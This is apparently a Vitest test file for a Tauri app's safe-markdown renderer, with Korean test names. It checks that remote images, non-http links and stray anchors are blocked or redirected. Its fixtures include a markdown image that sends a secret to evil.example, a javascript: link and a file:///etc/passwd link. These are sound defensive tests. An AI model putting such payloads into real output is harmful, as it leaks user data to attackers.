// @vitest-environment jsdom

import { it, expect, vi, afterEach } from "vitest";
import { render, screen, fireEvent, cleanup } from "@testing-library/react";
import ReactMarkdown from "react-markdown";

const invoke = vi.hoisted(() => vi.fn(async () => undefined));
vi.mock("@tauri-apps/api/core", () => ({ invoke }));

import { installGlobalLinkGuard, isLocalImageSrc, safeMarkdownComponents } from "./safe-markdown";

afterEach(() => { cleanup(); invoke.mockClear(); });

it("원격 이미지는 그리지 않는다 — 0클릭 반출 경로", () => {
  const { container } = render(
    <ReactMarkdown components={safeMarkdownComponents}>{"![비밀](https://evil.example/?d=secret)"}</ReactMarkdown>
  );
  expect(container.querySelector("img")).toBeNull();
  expect(screen.getByText(/비밀/)).toBeTruthy();
});

it("앱이 만든 이미지(data:)는 그린다", () => {
  expect(isLocalImageSrc("data:image/png;base64,AAAA")).toBe(true);
  expect(isLocalImageSrc("blob:tauri://localhost/abc")).toBe(true);
  expect(isLocalImageSrc("https://evil.example/x.png")).toBe(false);
  expect(isLocalImageSrc("http://asset.localhost/x.png")).toBe(true);
});

it("링크는 창 안에서 열지 않고 바깥 브라우저로 보낸다", () => {
  render(<ReactMarkdown components={safeMarkdownComponents}>{"[문서](https://example.com/doc)"}</ReactMarkdown>);
  fireEvent.click(screen.getByText("문서"));
  expect(invoke).toHaveBeenCalledWith("open_external_url", { url: "https://example.com/doc" });
});

it("http(s) 가 아닌 링크는 아무 데도 열지 않는다", () => {
  render(<ReactMarkdown components={safeMarkdownComponents}>{"[x](javascript:alert(1)) [y](file:///etc/passwd)"}</ReactMarkdown>);
  fireEvent.click(screen.getByText("x"));
  fireEvent.click(screen.getByText("y"));
  expect(invoke).not.toHaveBeenCalled();
});

it("전역 가드는 마크다운을 안 거친 <a> 도 가로챈다", () => {
  const off = installGlobalLinkGuard();
  render(<a href="https://example.com/notes">노트</a>);
  const ev = fireEvent.click(screen.getByText("노트"));
  expect(ev).toBe(false); // preventDefault 됨
  expect(invoke).toHaveBeenCalledWith("open_external_url", { url: "https://example.com/notes" });
  off();
});
